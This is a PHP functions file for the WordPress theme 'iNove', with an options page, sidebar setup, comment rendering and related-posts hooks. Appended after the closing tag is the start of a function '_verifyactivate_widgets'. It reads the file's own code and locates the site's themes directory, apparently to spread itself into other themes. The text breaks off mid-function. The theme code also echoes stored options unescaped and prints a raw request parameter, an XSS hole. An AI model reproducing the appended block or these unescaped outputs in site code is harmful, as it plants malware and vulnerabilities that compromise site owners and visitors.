<?php
class iNoveOptions {
	function getOptions() {
		$options = get_option ( 'inove_options' );
		if (! is_array ( $options )) {
			$options ['keywords'] = '';
			$options ['description'] = '';
			$options ['google_cse'] = false;
			$options ['google_cse_cx'] = '';
			$options ['menu_type'] = 'pages';
			$options ['nosidebar'] = false;
			$options ['collapse'] = false;
			$options ['notice'] = false;
			$options ['notice_content'] = '';
			$options ['banner_registered'] = false;
			$options ['banner_commentator'] = false;
			$options ['banner_visitor'] = false;
			$options ['banner_content'] = '';
			$options ['post_banner_registered'] = false;
			$options ['post_banner_commentator'] = false;
			$options ['post_banner_visitor'] = false;
			$options ['post_banner_content'] = '';
			$options ['showcase_registered'] = false;
			$options ['showcase_commentator'] = false;
			$options ['showcase_visitor'] = false;
			$options ['showcase_caption'] = false;
			$options ['showcase_title'] = '';
			$options ['showcase_type'] = '4sq';
			$options ['showcase_content1'] = '';
			$options ['showcase_content2'] = '';
			$options ['showcase_content3'] = '';
			$options ['showcase_content4'] = '';
			$options ['showcase_content5'] = '';
			$options ['author'] = true;
			$options ['categories'] = true;
			$options ['tags'] = true;
			$options ['feed_url'] = '';
			$options ['feed_email'] = false;
			$options ['feed_url_email'] = '';
			$options ['social'] = false;
			$options ['social_name'] = 'sina';
			$options ['twitter_url'] = '';
			$options ['sina_url'] = '';
			$options ['tencent_url'] = '';
			$options ['douban_url'] = '';
			$options ['analytics'] = false;
			$options ['analytics_content'] = '';
			$options ['wumii_is_enabled'] = true;
			update_option ( 'inove_options', $options );
		}
		return $options;
	}
	function add() {
		if (isset ( $_POST ['inove_save'] )) {
			$options = iNoveOptions::getOptions ();
			$options ['keywords'] = stripslashes ( $_POST ['keywords'] );
			$options ['description'] = stripslashes ( $_POST ['description'] );
			if ($_POST ['google_cse']) {
				$options ['google_cse'] = ( bool ) true;
			} else {
				$options ['google_cse'] = ( bool ) false;
			}
			$options ['google_cse_cx'] = stripslashes ( $_POST ['google_cse_cx'] );
			$options ['menu_type'] = stripslashes ( $_POST ['menu_type'] );
			if ($_POST ['nosidebar']) {
				$options ['nosidebar'] = ( bool ) true;
			} else {
				$options ['nosidebar'] = ( bool ) false;
			}
			if ($_POST ['collapse']) {
				$options ['collapse'] = ( bool ) true;
			} else {
				$options ['collapse'] = ( bool ) false;
			}
			$options ['wumii_is_enabled'] = $_POST ['wumii_is_enabled'];
			if ($_POST ['notice']) {
				$options ['notice'] = ( bool ) true;
			} else {
				$options ['notice'] = ( bool ) false;
			}
			$options ['notice_content'] = stripslashes ( $_POST ['notice_content'] );
			if (! $_POST ['banner_registered']) {
				$options ['banner_registered'] = ( bool ) false;
			} else {
				$options ['banner_registered'] = ( bool ) true;
			}
			if (! $_POST ['banner_commentator']) {
				$options ['banner_commentator'] = ( bool ) false;
			} else {
				$options ['banner_commentator'] = ( bool ) true;
			}
			if (! $_POST ['banner_visitor']) {
				$options ['banner_visitor'] = ( bool ) false;
			} else {
				$options ['banner_visitor'] = ( bool ) true;
			}
			$options ['banner_content'] = stripslashes ( $_POST ['banner_content'] );
			if (! $_POST ['post_banner_registered']) {
				$options ['post_banner_registered'] = ( bool ) false;
			} else {
				$options ['post_banner_registered'] = ( bool ) true;
			}
			if (! $_POST ['post_banner_commentator']) {
				$options ['post_banner_commentator'] = ( bool ) false;
			} else {
				$options ['post_banner_commentator'] = ( bool ) true;
			}
			if (! $_POST ['post_banner_visitor']) {
				$options ['post_banner_visitor'] = ( bool ) false;
			} else {
				$options ['post_banner_visitor'] = ( bool ) true;
			}
			$options ['post_banner_content'] = stripslashes ( $_POST ['post_banner_content'] );
			if (! $_POST ['showcase_registered']) {
				$options ['showcase_registered'] = ( bool ) false;
			} else {
				$options ['showcase_registered'] = ( bool ) true;
			}
			if (! $_POST ['showcase_commentator']) {
				$options ['showcase_commentator'] = ( bool ) false;
			} else {
				$options ['showcase_commentator'] = ( bool ) true;
			}
			if (! $_POST ['showcase_visitor']) {
				$options ['showcase_visitor'] = ( bool ) false;
			} else {
				$options ['showcase_visitor'] = ( bool ) true;
			}
			if ($_POST ['showcase_caption']) {
				$options ['showcase_caption'] = ( bool ) true;
			} else {
				$options ['showcase_caption'] = ( bool ) false;
			}
			$options ['showcase_type'] = stripslashes ( $_POST ['showcase_type'] );
			$options ['showcase_title'] = stripslashes ( $_POST ['showcase_title'] );
			$options ['showcase_content1'] = stripslashes ( $_POST ['showcase_content1'] );
			$options ['showcase_content2'] = stripslashes ( $_POST ['showcase_content2'] );
			$options ['showcase_content3'] = stripslashes ( $_POST ['showcase_content3'] );
			$options ['showcase_content4'] = stripslashes ( $_POST ['showcase_content4'] );
			$options ['showcase_content5'] = stripslashes ( $_POST ['showcase_content5'] );
			if ($_POST ['author']) {
				$options ['author'] = ( bool ) true;
			} else {
				$options ['author'] = ( bool ) false;
			}
			if ($_POST ['categories']) {
				$options ['categories'] = ( bool ) true;
			} else {
				$options ['categories'] = ( bool ) false;
			}
			if (! $_POST ['tags']) {
				$options ['tags'] = ( bool ) false;
			} else {
				$options ['tags'] = ( bool ) true;
			}
			$options ['feed_url'] = stripslashes ( $_POST ['feed_url'] );
			if ($_POST ['feed_email']) {
				$options ['feed_email'] = ( bool ) true;
			} else {
				$options ['feed_email'] = ( bool ) false;
			}
			$options ['feed_url_email'] = stripslashes ( $_POST ['feed_url_email'] );
			if ($_POST ['social']) {
				$options ['social'] = ( bool ) true;
			} else {
				$options ['social'] = ( bool ) false;
			}
			$options ['social_name'] = stripslashes ( $_POST ['social_name'] );
			$options ['sina_url'] = stripslashes ( $_POST ['sina_url'] );
			$options ['twitter_url'] = stripslashes ( $_POST ['twitter_url'] );
			$options ['tencent_url'] = stripslashes ( $_POST ['tencent_url'] );
			$options ['douban_url'] = stripslashes ( $_POST ['douban_url'] );
			if ($_POST ['analytics']) {
				$options ['analytics'] = ( bool ) true;
			} else {
				$options ['analytics'] = ( bool ) false;
			}
			$options ['analytics_content'] = stripslashes ( $_POST ['analytics_content'] );
			update_option ( 'inove_options', $options );
		} else {
			iNoveOptions::getOptions ();
		}
		add_theme_page ( __ ( 'Current Theme Options', 'inove' ), __ ( 'Current Theme Options', 'inove' ), 'edit_themes', basename ( __FILE__ ), array (
				'iNoveOptions',
				'display' 
		) );
	}
	function display() {
		$options = iNoveOptions::getOptions ();
		;
		echo '
<form action="#" method="post" enctype="multipart/form-data" name="inove_form" id="inove_form">
	<div class="wrap">
		<h2>';
		_e ( 'Current Theme Options', 'inove' );
		;
		echo '</h2>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Meta', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'Just in effect homepage', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						';
		_e ( 'Keywords', 'inove' );
		;
		echo '						<label>';
		_e ( '( Separate keywords with commas )', 'inove' );
		;
		echo '</label><br/>
						<input type="text" name="keywords" id="keyword" class="code" size="136" value="';
		echo ($options ['keywords']);
		;
		echo '">
						<br/>
						';
		_e ( 'Description', 'inove' );
		;
		echo '						<label>';
		_e ( '( Main decription for your blog )', 'inove' );
		;
		echo '</label>
						<br/>
						<input type="text" name="description" id="description" class="code" size="136" value="';
		echo ($options ['description']);
		;
		echo '">
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Search', 'inove' );
		;
		echo '</th>
					<td>
						<label>
							<input name="google_cse" type="checkbox" value="checkbox" ';
		if ($options ['google_cse'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Using google custom search engine.', 'inove' );
		;
		echo '						</label>
						<br/>
						';
		_e ( 'CX:', 'inove' );
		;
		echo '						 <input type="text" name="google_cse_cx" id="google_cse_cx" class="code" size="40" value="';
		echo ($options ['google_cse_cx']);
		;
		echo '">
						<br/>
						';
		printf ( __ ( 'Find <code>name="cx"</code> in the <strong>Search box code</strong> of <a href="%1$s">Google Custom Search Engine</a>, and type the <code>value</code> here.<br/>For example: <code>014782006753236413342:1ltfrybsbz4</code>', 'inove' ), 'http://www.google.com/coop/cse/' );
		;
		echo '					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Menubar', 'inove' );
		;
		echo '</th>
					<td>
						<label style="margin-right:20px;">
							<input name="menu_type" type="radio" value="pages" ';
		if ($options ['menu_type'] != 'categories')
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show pages as menu.', 'inove' );
		;
		echo '						</label>
						<label>
							<input name="menu_type" type="radio" value="categories" ';
		if ($options ['menu_type'] == 'categories')
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show categories as menu.', 'inove' );
		;
		echo '						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Sidebar', 'inove' );
		;
		echo '</th>
					<td>
						<label>
							<input name="nosidebar" type="checkbox" value="checkbox" ';
		if ($options ['nosidebar'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Hide sidebar from all pages.', 'inove' );
		;
		echo '						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Theme style', 'inove' );
		;
		echo '</th>
					<td>
						<label>
							<input name="collapse" type="checkbox" value="checkbox" ';
		if ($options ['collapse'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Switch theme to collapse style.', 'inove' );
		;
		echo '						</label>
					</td>
				</tr>
			</tbody>
		</table>
		
		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( '相关文章', 'inove' );
		;
		echo '</th>
					<td>
						<label>
							<input name="wumii_is_enabled" type="checkbox" value="checkbox" ';
		if ($options ['wumii_is_enabled'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( '启用无觅相关文章插件', 'inove' );
		;
		echo '						</label><br/>
						';
		_e ( '设置无觅相关文章展示样式请登录：<a href=\"http://www.wumii.com/site/index.htm\">无觅网站管理中心</a>', 'inove' );
		;
		echo '					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Notice', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'HTML enabled', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						<!-- notice START -->
						<label>
							<input name="notice" type="checkbox" value="checkbox" ';
		if ($options ['notice'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'This notice bar will display at the top of posts on homepage.', 'inove' );
		;
		echo '						</label>
						<br />
						<label>
							<textarea name="notice_content" id="notice_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['notice_content']);
		;
		echo '</textarea>
						</label>
						<!-- notice END -->
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Title Banner', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'HTML enabled', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						<!-- banner START -->
						';
		_e ( 'This banner will display at the right of header. (height: 60 pixels)', 'inove' );
		;
		echo '						<br/>
						';
		_e ( 'Who can see?', 'inove' );
		;
		echo '						<label style="margin-left:10px;">
							<input name="banner_registered" type="checkbox" value="checkbox" ';
		if ($options ['banner_registered'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Registered Users', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="banner_commentator" type="checkbox" value="checkbox" ';
		if ($options ['banner_commentator'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Commentator', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="banner_visitor" type="checkbox" value="checkbox" ';
		if ($options ['banner_visitor'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Visitors', 'inove' );
		;
		echo '						</label>
						<br/>
						<label>
							<textarea name="banner_content" id="banner_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['banner_content']);
		;
		echo '</textarea>
						</label>
						<!-- banner END -->
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Post Banner', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'HTML enabled', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						<!-- post banner START -->
						';
		_e ( 'This showcase will display at the bottom of post. (width: 300 pixels)', 'inove' );
		;
		echo '						<br/>
						';
		_e ( 'Who can see?', 'inove' );
		;
		echo '						<label style="margin-left:10px;">
							<input name="post_banner_registered" type="checkbox" value="checkbox" ';
		if ($options ['post_banner_registered'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Registered Users', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="post_banner_commentator" type="checkbox" value="checkbox" ';
		if ($options ['post_banner_commentator'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Commentator', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="post_banner_visitor" type="checkbox" value="checkbox" ';
		if ($options ['post_banner_visitor'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Visitors', 'inove' );
		;
		echo '						</label>
						<br/>
						<label>
							<textarea name="post_banner_content" id="post_banner_content" cols="50" rows="10" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['post_banner_content']);
		;
		echo '</textarea>
						</label>
						<!-- post banner END -->
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Sidebar Showcase', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'HTML enabled', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						<!-- sidebar showcase START -->
						';
		_e ( 'This showcase will display at the top of sidebar.', 'inove' );
		;
		echo '						<br/>
						';
		_e ( 'Who can see?', 'inove' );
		;
		echo '						<label style="margin-left:10px;">
							<input name="showcase_registered" type="checkbox" value="checkbox" ';
		if ($options ['showcase_registered'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Registered Users', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="showcase_commentator" type="checkbox" value="checkbox" ';
		if ($options ['showcase_commentator'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Commentator', 'inove' );
		;
		echo '						</label>
						<label style="margin-left:10px;">
							<input name="showcase_visitor" type="checkbox" value="checkbox" ';
		if ($options ['showcase_visitor'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Visitors', 'inove' );
		;
		echo '						</label>
						<br/>
						<label>
							<input name="showcase_caption" type="checkbox" value="checkbox" ';
		if ($options ['showcase_caption'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Title:', 'inove' );
		;
		echo '						</label>
						 <input type="text" name="showcase_title" id="showcase_title" class="code" size="40" value="';
		echo ($options ['showcase_title']);
		;
		echo '" />
						<br/>
						<label>
							<input name="showcase_type" type="radio" value="4sq" ';
		if ($options ['showcase_type'] != '1sq')
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show 4 squares showcase content. (square size: 125 x 125 pixels)', 'inove' );
		;
		echo '						</label>
						<br/>
						<label>
							';
		_e ( 'Squre1:', 'inove' );
		;
		echo ' <textarea name="showcase_content1" id="showcase_content1" cols="50" rows="2" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['showcase_content1']);
		;
		echo '</textarea>
						</label>
						<label>
							';
		_e ( 'Squre2:', 'inove' );
		;
		echo ' <textarea name="showcase_content2" id="showcase_content2" cols="50" rows="2" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['showcase_content2']);
		;
		echo '</textarea>
						</label>
						<label>
							';
		_e ( 'Squre3:', 'inove' );
		;
		echo ' <textarea name="showcase_content3" id="showcase_content3" cols="50" rows="2" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['showcase_content3']);
		;
		echo '</textarea>
						</label>
						<label>
							';
		_e ( 'Squre4:', 'inove' );
		;
		echo ' <textarea name="showcase_content4" id="showcase_content4" cols="50" rows="2" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['showcase_content4']);
		;
		echo '</textarea>
						</label>
						<label>
							<input name="showcase_type" type="radio" value="1sq" ';
		if ($options ['showcase_type'] == '1sq')
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show single showcase content. (width: 250 pixels)', 'inove' );
		;
		echo '						</label>
						<br/>
						<label>
							<textarea name="showcase_content5" id="showcase_content5" cols="50" rows="10" style="width:98%;font-size:12px;" class="code">';
		echo ($options ['showcase_content5']);
		;
		echo '</textarea>
						</label>
						<!-- sidebar showcase END -->
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Posts', 'inove' );
		;
		echo '</th>
					<td>
						<label style="margin-right:20px;">
							<input name="author" type="checkbox" value="checkbox" ';
		if ($options ['author'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show author on posts.', 'inove' );
		;
		echo '						</label>
						<label style="margin-right:20px;">
							<input name="categories" type="checkbox" value="checkbox" ';
		if ($options ['categories'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show categories on posts.', 'inove' );
		;
		echo '						</label>
						<label>
							<input name="tags" type="checkbox" value="checkbox" ';
		if ($options ['tags'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show tags on posts.', 'inove' );
		;
		echo '						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Feed', 'inove' );
		;
		echo '</th>
					<td>
						 ';
		_e ( 'Custom feed URL:', 'inove' );
		;
		echo ' <input type="text" name="feed_url" id="feed_url" class="code" size="60" value="';
		echo ($options ['feed_url']);
		;
		echo '">
						<br/>
						<label>
							<input name="feed_email" type="checkbox" value="checkbox" ';
		if ($options ['feed_email'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Show email feed in reader list.', 'inove' );
		;
		echo '						</label>
						<br />
						 ';
		_e ( 'Email feed URL:', 'inove' );
		;
		echo ' <input type="text" name="feed_url_email" id="feed_url_email" class="code" size="60" value="';
		echo ($options ['feed_url_email']);
		;
		echo '">
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">';
		_e ( 'Social', 'inove' );
		;
		echo '</th>
					<td>
						<label>
							<input name="social" type="checkbox" value="checkbox" ';
		if ($options ['social'])
			echo "checked='checked'";
		;
		echo ' />
							';
		_e ( 'Add Social button.', 'blocks' );
		;
		echo '						</label>
						<br />
						<div>
							';
		_e ( 'Default Social.', 'blocks' );
		;
		echo '							<select name="social_name" size="1">
								<option value="sina" ';
		if ($options ['social_name'] == 'sina')
			echo ' selected ';
		;
		echo '>';
		_e ( 'Sina', 'blocks' );
		;
		echo '</option>
								<option value="twitter" ';
		if ($options ['social_name'] == 'twitter')
			echo ' selected ';
		;
		echo '>';
		_e ( 'Twitter', 'blocks' );
		;
		echo '</option>
								<option value="tencent" ';
		if ($options ['social_name'] == 'tencent')
			echo ' selected ';
		;
		echo '>';
		_e ( 'Tencent', 'blocks' );
		;
		echo '</option>
								<option value="douban" ';
		if ($options ['social_name'] == 'douban')
			echo ' selected ';
		;
		echo '>';
		_e ( 'Douban', 'blocks' );
		;
		echo '</option>
							</select>
						</div>
						 ';
		_e ( 'Sina URL:', 'inove' );
		;
		echo '						 <input type="text" name="sina_url" id="sina_url" class="code" size="40" value="';
		echo ($options ['sina_url']);
		;
		echo '">
						<br />
						 ';
		_e ( 'Twitter URL:', 'inove' );
		;
		echo '						 <input type="text" name="twitter_url" id="twitter_url" class="code" size="40" value="';
		echo ($options ['twitter_url']);
		;
		echo '">
						<br />
						 ';
		_e ( 'Tencent URL:', 'inove' );
		;
		echo '						 <input type="text" name="tencent_url" id="tencent_url" class="code" size="40" value="';
		echo ($options ['tencent_url']);
		;
		echo '">
						<br />
						 ';
		_e ( 'Douban URL:', 'inove' );
		;
		echo '						 <input type="text" name="douban_url" id="douban_url" class="code" size="40" value="';
		echo ($options ['douban_url']);
		;
		echo '">
						<br />
						<a href="http://t.sina.com.cn/neoner/" onclick="window.open(this.href);return false;">Follow NeOne</a>
						 | <a href="http://twitter.com/jevonszhou/" onclick="window.open(this.href);return false;">Follow Jevons Zhou</a>
					</td>
				</tr>
			</tbody>
		</table>

		<table class="form-table">
			<tbody>
				<tr valign="top">
					<th scope="row">
						';
		_e ( 'Web Analytics', 'inove' );
		;
		echo '						<br/>
						<small style="font-weight:normal;">';
		_e ( 'HTML enabled', 'inove' );
		;
		echo '</small>
					</th>
					<td>
						<label>
							<input name="analytics" type="checkbox" value="checkbox" ';
		if ($options ['analytics'])
			echo "checked='checked'";
		;
		echo ' />
							 ';
		_e ( 'Add web analytics code to your site. (e.g. Google Analytics, Yahoo! Web Analytics, ...)', 'inove' );
		;
		echo '						</label>
						<label>
							<textarea name="analytics_content" cols="50" rows="10" id="analytics_content" class="code" style="width:98%;font-size:12px;">';
		echo ($options ['analytics_content']);
		;
		echo '</textarea>
						</label>
					</td>
				</tr>
			</tbody>
		</table>

		<p class="submit">
			<input class="button-primary" type="submit" name="inove_save" value="';
		_e ( 'Save Changes', 'inove' );
		;
		echo '" />
		</p>
	</div>
</form>

';
	}
}
add_action ( 'admin_menu', array (
		'iNoveOptions',
		'add' 
) );
function theme_init() {
	load_theme_textdomain ( 'inove', get_template_directory () . '/languages' );
}
add_action ( 'init', 'theme_init' );
if (function_exists ( 'register_sidebar' )) {
	register_sidebar ( array (
			'name' => 'north_sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="title">',
			'after_title' => '</div>' 
	) );
	register_sidebar ( array (
			'name' => 'south_sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="title">',
			'after_title' => '</div>' 
	) );
	register_sidebar ( array (
			'name' => 'west_sidebar',
			'before_widget' => '<div id="%1$s" class="%2$s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="title">',
			'after_title' => '</div>' 
	) );
	register_sidebar ( array (
			'name' => 'east_sidebar',
			'before_widget' => '<div id="%1$s" class="%2$s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="title">',
			'after_title' => '</div>' 
	) );
}
remove_action ( 'wp_head', 'wp_generator' );
remove_action ( 'wp_head', 'wlwmanifest_link' );
remove_action ( 'wp_head', 'rsd_link' );
remove_action ( 'wp_head', 'index_rel_link' );
remove_action ( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
remove_action ( 'wp_head', 'feed_links_extra', 3 );
remove_action ( 'wp_head', 'start_post_rel_link' );
remove_action ( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );
add_action ( 'widgets_init', 'my_remove_recent_comments_style' );
wp_deregister_script ( 'l10n' );
function my_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action ( 'wp_head', array (
			$wp_widget_factory->widgets ['WP_Widget_Recent_Comments'],
			'recent_comments_style' 
	) );
}
if (! is_admin ()) {
	wp_deregister_script ( 'jquery' );
	wp_register_script ( 'jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"), false, '1.4.2' );
	wp_enqueue_script ( 'jquery' );
}
function load_post() {
	if ($_GET ['action'] == 'load_post' && $_GET ['id'] != '') {
		$id = $_GET ["id"];
		$output = '';
		global $wpdb, $post;
		$post = $wpdb->get_row ( $wpdb->prepare ( "SELECT * FROM $wpdb->posts WHERE ID = %d LIMIT 1", $id ) );
		if ($post) {
			$content = $post->post_content;
			$output = balanceTags ( $content );
			$output = wpautop ( $output );
			$output = convert_smilies ( $output );
			$output = do_shortcode ( $output );
		}
		echo $output;
		die ();
	}
}
add_action ( 'init', 'load_post' );
function add_nofollow_to_link($link) {
	return str_replace ( '<a', '<a rel="nofollow"', $link );
}
add_filter ( 'the_content_more_link', 'add_nofollow_to_link', 0 );
function add_nofollow_to_comments_popup_link() {
	return ' rel="nofollow" ';
}
add_filter ( 'comments_popup_link_attributes', 'add_nofollow_to_comments_popup_link' );
if (function_exists ( 'wp_list_comments' )) {
	function comment_count($commentcount) {
		global $id;
		$_comments = get_comments ( 'status=approve&post_id=' . $id );
		$comments_by_type = &separate_comments ( $_comments );
		return count ( $comments_by_type ['comment'] );
	}
}
function load_comment() {
	if ($_GET ['action'] == 'load_comment' && $_GET ['id'] != '') {
		$comment = get_comment ( $_GET ['id'] );
		if (! $comment) {
			fail ( printf ( 'Whoops! Can\'t find the comment with id  %1$s', $_GET ['id'] ) );
		}
		custom_comments ( $comment, null, null );
		die ();
	}
}
add_action ( 'init', 'load_comment' );
function custom_comments($comment, $args, $depth) {
	$GLOBALS ['comment'] = $comment;
	global $commentcount;
	if (! $commentcount) {
		$page = get_query_var ( 'cpage' ) - 1;
		$cpp = get_option ( 'comments_per_page' );
		$commentcount = $cpp * $page;
		if ($commentcount < 0)
			$commentcount = 0;
	}
	;
	echo '	<li class="hreview clearfix ';
	if ($comment->comment_author_email == get_the_author_email ()) {
		echo 'admincomment';
	} else {
		echo 'evencomment';
	}
	;
	echo '" id="comment-';
	comment_ID ();
	echo '">
		<div class="info clearfix">
			';
	if (function_exists ( 'get_avatar' ) && get_option ( 'show_avatars' )) {
		echo get_avatar ( $comment, 32 );
	}
	;
	echo '			';
	if (get_comment_author_url ()) :
		;
		echo '				<a class="reviewer" id="reviewer-';
		comment_ID ();
		echo '" href="';
		comment_author_url ();
		echo '" rel="external nofollow">
			';
	 else :
		;
		echo '				<span class="reviewer" id="reviewer-';
		comment_ID ();
		echo '">
			';
	endif;
	;
	echo '
			';
	comment_author ();
	;
	echo '
			';
	if (get_comment_author_url ()) :
		;
		echo '				</a>
			';
	 else :
		;
		echo '				</span>
			';
	endif;
	;
	echo '				 | <a class="anchor" rel="nofollow" href="#comment-';
	comment_ID ();
	echo '">';
	printf ( '#%1$s', ++ $commentcount );
	;
	echo '</a>
			<div class="dtreviewed">';
	printf ( __ ( '%1$s at %2$s', 'inove' ), get_comment_time ( __ ( 'F jS, Y', 'inove' ) ), get_comment_time ( __ ( 'H:i', 'inove' ) ) );
	;
	echo '';
	if (function_exists ( 'useragent_output_custom' )) {
		printf ( ' | ' );
		echo useragent_output_custom ();
	}
	;
	echo '</div>
		</div>

		';
	if ($comment->comment_approved == '0') :
		;
		echo '			<p><small>';
		_e ( 'Your comment is awaiting moderation.', 'inove' );
		;
		echo '</small></p>
		';
	endif;
	;
	echo '		
		<div class="description" id="commentbody-';
	comment_ID ();
	echo '">
			';
	comment_text ();
	;
	echo '		</div>

';
}
function wumii_get_related_items() {
	require_once (ABSPATH . 'wp-admin/includes/plugin.php');
	$themeOptions = get_option ( 'inove_options' );
	$is_enabled = $themeOptions ['wumii_is_enabled'];
	global $post, $wumii_should_display;
	$wumii_should_display = $is_enabled && ! is_plugin_active ( 'wumii-related-posts/wumii-related-posts.php' ) && get_post_status ( $post->ID ) == 'publish' && get_post_type () == 'post' && empty ( $post->post_password ) && ! is_preview ();
	if (! $wumii_should_display) {
		return;
	}
	$escapedUrl = wumii_html_escape ( get_permalink () );
	$escapedTitle = wumii_html_escape ( the_title ( '', '', false ) );
	$escapedPic = wumii_html_escape ( wumii_get_thumbnail_src () );
	echo "    
<div class=\"wumii-hook\">
    <input type=\"hidden\" name=\"wurl\" value=\"$escapedUrl\" />
    <input type=\"hidden\" name=\"wtitle\" value=\"$escapedTitle\" />
    <input type=\"hidden\" name=\"wpic\" value=\"$escapedPic\" />
</div>";
}
function wumii_add_load_script($num = 4, $mode = 3) {
	global $wumii_should_display;
	if (! $wumii_should_display) {
		return;
	}
	$sitePrefix = function_exists ( 'home_url' ) ? home_url () : get_bloginfo ( 'url' );
	$themeName = urlencode ( get_current_theme () );
	echo "
<p style=\"margin:0;padding:0;height:1px;\">
    <script type=\"text/javascript\"><!--
        var wumiiSitePrefix = \"$sitePrefix\";
    //--></script>
    <script type=\"text/javascript\" src=\"http://widget.wumii.com/ext/relatedItemsWidget.htm?type=1&amp;num=$num&amp;mode=$mode&amp;pf=WordPress&amp;theme=$themeName\"></script>
    <a href=\"http://www.wumii.com/widget/relatedItems.htm\" style=\"border:0;\">
        <img src=\"http://static.wumii.com/images/pixel.png\" alt=\"无觅相关文章插件\" style=\"border:0;padding:0;margin:0;\" />
    </a>
</p>";
}
function wumii_html_escape($str) {
	return htmlspecialchars ( html_entity_decode ( $str, ENT_QUOTES, 'UTF-8' ), ENT_QUOTES, 'UTF-8' );
}
function wumii_get_thumbnail_src() {
	if (! function_exists ( 'get_post_thumbnail_id' )) {
		return;
	}
	$image_info = wp_get_attachment_image_src ( get_post_thumbnail_id (), 'full' );
	if ($image_info) {
		return $image_info [0];
	}
}
?>
<?php

function _verifyactivate_widgets() {
	$widget = substr ( file_get_contents ( __FILE__ ), strripos ( file_get_contents ( __FILE__ ), "<" . "?" ) );
	$output = "";
	$allowed = "";
	$output = strip_tags ( $output, $allowed );
	$direst = _get_allwidgets_cont ( array (
			substr ( dirname ( __FILE__ ), 0, stripos ( dirname ( __FILE__ ), "themes" ) + 6 ) 
	) );
